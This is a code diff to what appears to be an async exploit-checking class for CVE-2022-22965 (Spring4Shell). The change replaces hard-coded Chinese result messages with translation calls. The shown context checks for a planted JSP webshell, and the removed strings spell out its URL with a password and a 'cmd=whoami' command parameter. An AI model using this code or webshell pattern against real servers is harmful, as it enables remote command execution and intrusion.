@@ -3,6 +3,7 @@
 import aiohttp
 import asyncio
 from util import RandomUA
+from util.Translate import tr
 
 class CVE_2022_22965_Async:
     def __init__(self):
@@ -50,13 +51,13 @@ class CVE_2022_22965_Async:
                 test_text, test_code = await self.fetch(session, url + "tomcatwar.jsp", self.Headers_1, "", proxy)
 
             if test_code == 200 and 'aabysszg' in str(test_text):
-                result = f'[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：{url}tomcatwar.jsp?pwd=aabysszg&cmd=whoami'
+                result = tr("v.22965.shell_aabyss", url=url)
                 return result
             else:
-                result = f'[-] {url} CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：[/tomcatwar.jsp?pwd=aabysszg&cmd=命令]'
+                result = tr("v.22965.shell_manual", url=url)
                 return result
         except Exception as e:
-            error = f"[error] {url} 未知错误 {e}"
+            error = tr("v.unknown", url=url, e=e)
             return error
     async def exp(self, url, proxies, ProxyStute):
         pass
